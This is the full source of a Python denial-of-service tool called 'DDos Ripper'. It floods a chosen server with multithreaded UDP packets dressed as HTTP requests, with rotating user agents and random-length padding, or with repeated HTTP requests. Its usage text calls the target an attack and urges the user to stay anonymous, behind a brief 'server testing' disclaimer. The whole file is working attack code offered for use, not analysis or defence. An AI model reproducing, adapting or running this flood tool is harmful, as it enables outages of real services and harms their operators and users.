from optparse import OptionParser
import time, sys, socket, threading, random, string
import urllib.request


def user_agent():
    global uagent
    uagent = []
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    uagent.append("Mozilla / 5.0(X11;Linux i686; rv:81.0) Gecko / 20100101 Firefox / 81.0")
    uagent.append("Mozilla / 5.0(Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
    uagent.append("Mozilla / 5.0(X11;Ubuntu;Linuxi686;rv:81.0) Gecko / 20100101Firefox / 81.0")
    uagent.append("Mozilla / 5.0(X11;Ubuntu;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
    uagent.append("Mozilla / 5.0(X11;Fedora;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
    return (uagent)


def headers():
    # reading headers
    global data
    headers = open("headers.txt", "r")
    data = headers.read()
    headers.close()


def get_random_string(len_from, len_to):
    # Random string with different length
    length = random.randint(len_from, len_to)
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


def get_random_port():
    ports = [22, 53, 80, 443]
    return random.choice(ports)


def down_it_udp():
    i = 1
    while True:
        if random_packet_len:
            extra_data = get_random_string(0, 50000)
        else:
            extra_data = ''
        packet = str(
            "GET / HTTP/1.1\nHost: " + host
            + "\n\n User-Agent: "
            + random.choice(uagent)
            + "\n" + data
            + "\n\n" + extra_data).encode('utf-8')
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        p = int(port) if port else get_random_port()
        try:
            s.sendto(packet, (host, p))
        except socket.gaierror:
            print("\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m")
        else:
            print('\033[92m Packet was sent \033[0;0m')
        s.close()

        if port:
            i += 1
            if i == 50:
                i = 1
                thread = threading.Thread(target=connect_host)
                thread.daemon = True
                thread.start()
        time.sleep(.01)


def down_it_http():
    while True:
        try:
            protocol = 'http://'
            if port == 443:
                protocol = 'https://'

            url = f"{protocol}{host}:{port}"
            urllib.request.urlopen(
                urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)})
            )
        except:
            print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
                  " Program will continue working.\033[0m")
        else:
            print('\033[92m HTTP-Request was done \033[0;0m')

        time.sleep(.01)


def usage():
    print(''' \033[0;95mDDos Ripper 

	It is the end user's responsibility to obey all applicable laws.
	It is just like a server testing script and Your ip is visible. Please, make sure you are anonymous! \n
	Usage : python3 dripper.py [-s] [-p] [-t] [-pr]
	-h : -help
	-s : -server ip
	-p : -port default 80
	-t : -threads default 100\033[0m ''')

    sys.exit()


def get_parameters():
    global host
    global port
    global thr
    global item
    global random_packet_len
    global attack_method
    optp = OptionParser(add_help_option=False, epilog="Rippers")
    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--threads", type="int", dest="threads", help="default 100")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    optp.add_option("-r", "--random_len", type="int", dest="random_packet_len",
                    help="Send random packets with random length")
    optp.add_option("-m", "--method", type="str", dest="attack_method",
                    help="Attack method: udp (default), http")
    opts, args = optp.parse_args()
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = None
    else:
        port = opts.port

    if opts.threads is None:
        thr = 100
    else:
        thr = opts.threads

    if opts.random_packet_len:
        random_packet_len = True
    else:
        random_packet_len = False

    if opts.attack_method and opts.attack_method in ['udp', 'http']:
        attack_method = opts.attack_method
    else:
        attack_method = 'udp'


def check_host():
    try:
        socket.gethostbyname(host)
    except:
        return False
    else:
        return True


def connect_host():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, int(port)))
    except:
        print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
              " Program will continue send UDP-packets to the destination.\033[0m")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()

    if not check_host():
        print("\033[91mCheck server ip and port! Wrong format of server name or no connection.\033[0m")
        exit()

    if port:
        connect_host()

    p = str(port) if port else '(22, 53, 80, 443)'
    print("\033[92m", host, " port: ", p, " threads: ", str(thr), "\033[0m")
    print("\033[94mPlease wait...\033[0m")
    user_agent()
    headers()
    time.sleep(5)

    thrs = []
    for i in range(int(thr)):
        if attack_method == 'udp':
            thrs.append(threading.Thread(target=down_it_udp))
        elif attack_method == 'http':
            thrs.append(threading.Thread(target=down_it_http))
        thrs[i].daemon = True  # if thread is exist, it dies
        thrs[i].start()

    while True:
        time.sleep(.1)
